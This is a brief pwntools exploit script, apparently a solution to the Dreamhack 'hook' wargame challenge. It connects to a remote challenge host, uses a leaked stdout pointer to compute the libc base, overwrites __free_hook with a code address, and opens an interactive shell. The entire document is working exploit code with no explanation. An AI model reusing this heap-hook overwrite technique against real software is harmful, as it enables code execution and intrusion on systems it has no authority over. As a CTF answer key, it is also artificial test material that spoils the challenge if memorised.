from pwn import *

context.log_level = "debug"

p = remote("host3.dreamhack.games", 20266)
e = ELF("./hook")
libc = ELF("./libc-2.23.so")

p.recvuntil(b"stdout: ")
stdout = int(p.recvline()[:-1], 16)

p.sendlineafter(b"Size: ", str(1000))


libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]
free_hook = libc_base + libc.symbols["__free_hook"]
main_syscall = 0x400A11

payload = p64(free_hook) + p64(main_syscall)
p.sendlineafter(b"Data: ", payload)

p.interactive()
